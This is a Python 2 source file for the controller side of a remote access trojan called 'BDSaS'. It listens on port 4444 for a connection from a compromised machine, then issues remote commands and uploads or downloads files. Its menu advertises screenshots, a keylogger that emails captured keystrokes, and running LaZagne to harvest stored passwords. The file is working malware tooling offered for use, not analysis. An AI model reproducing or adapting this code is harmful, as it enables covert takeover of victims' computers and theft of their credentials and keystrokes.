#!/usr/bin/python2.7

import socket
import json
import base64
import pyfiglet

class Listener:

	def __init__(self,ip,port):

		listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		listener.bind((ip,port))
		listener.listen(0)
		print "[+] Waiting for Incoming Connection"
		self.connection,address = listener.accept()
		print "[+] Got a Connection from " + str(address)

	def reliable_send(self,data):
		json_data = json.dumps(data, encoding = 'latin1')
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	
		
	def execute_remotely(self,command):
		self.reliable_send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()

		return self.reliable_receive()

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Download Succesful"

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def run(self):

		while True:
			command = raw_input(">> ")
			command = command.split(" ")

			try:

				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content)
					
				result = self.execute_remotely(command)
		
				if command[0] == "download" and "[-] Error " not in result:
					result = self.write_file(command[1],result)
					
			except Exception:
				result = "[-] Error during command execution"
				
			print result

banner=pyfiglet.figlet_format("                    BDSaS")
print (banner)
print("------------------------------ FEATURES --------------------------------")
print("\n")
print("1. To Execute system commands               > the_command")
print("2. To Change working directory              > cd directory")
print("3. To Upload and Download files             > Upload/Download filename")
print("4. To Restart or ShutDown computer          > Shutdown -s/-r")
print("5. To Take a Screenshot                     > Screenshot")
print("6. To Launch Keylogger                      > Keylogger mail mailpassword")
print("7. To Send a message                        > Message messageHead MessageBody")
print("8. To Run Lazagne                           > Get_passwords option")
print("\n")

my_listener = Listener("192.168.31.128",4444)
my_listener.run()
